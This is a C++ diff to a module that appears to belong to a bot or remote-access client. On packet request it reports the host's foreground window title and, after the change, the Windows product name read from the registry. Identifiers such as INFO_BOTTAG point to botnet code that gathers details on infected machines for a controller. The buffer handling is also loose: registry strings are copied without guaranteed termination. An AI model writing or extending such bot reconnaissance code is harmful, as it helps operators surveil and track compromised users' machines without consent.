@@ -29,7 +29,6 @@ void Info::OnPacketArrived(BYTE* packetData, size_t packetSize)
 {
 	BYTE* SendBackBuffer = NULL;
 	size_t sizeOfSendBackBuffer = 0;
-	OSVERSIONINFOW info;
 	HWND hwnd;
 	int titleLength;
 
@@ -55,18 +54,33 @@ void Info::OnPacketArrived(BYTE* packetData, size_t packetSize)
 		sizeOfSendBackBuffer = (titleLength * 2) + 1 + 2;
 		break;
 	case INFO_WINDOW_VERSION:
-		//TODO: Get windows product from registry key
-		ZeroMemory(&info, sizeof(OSVERSIONINFOW));
-		info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOW);
-		GetVersionEx(&info);
-		SendBackBuffer = (BYTE*)malloc(5);
+	{
+		HKEY hKey;
+		LONG lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey);
+		if (lResult == ERROR_SUCCESS)
+		{
+			wchar_t value[256];
+			DWORD valueLength = sizeof(value);
+			DWORD keyType = REG_SZ;
+			if (RegQueryValueEx(hKey, L"ProductName",  NULL, &keyType, (BYTE*)&value, &valueLength) == ERROR_SUCCESS)
+			{
+				sizeOfSendBackBuffer = 1 + valueLength;
+				SendBackBuffer = (BYTE*)malloc(sizeOfSendBackBuffer);
+				SendBackBuffer[0] = INFO_WINDOW_VERSION;
+				wcsncpy((WCHAR*)(SendBackBuffer + 1), value, valueLength / 2);
+				RegCloseKey(hKey);
+				break;
+			}
+			RegCloseKey(hKey);
+		}
+		//In case failed to read registry
+		sizeOfSendBackBuffer = 5 + sizeof(L"Unknown Window Version");
+		SendBackBuffer = (BYTE*)malloc(sizeOfSendBackBuffer);
+		ZeroMemory(SendBackBuffer, sizeOfSendBackBuffer);
 		SendBackBuffer[0] = INFO_WINDOW_VERSION;
-		SendBackBuffer[1] = info.dwMajorVersion;
-		SendBackBuffer[2] = info.dwMinorVersion;
-		SendBackBuffer[3] = info.dwBuildNumber;
-		SendBackBuffer[4] = info.dwPlatformId;
-		sizeOfSendBackBuffer = 5;
+		wcsncpy((WCHAR*)(SendBackBuffer + 1), L"Unknown Window Version", sizeof(L"Unknown Window Version") / 2);
 		break;
+	}
 	case INFO_BOTTAG:
 		SendBackBuffer = (BYTE*)malloc(50);
 		SendBackBuffer[0] = INFO_BOTTAG;
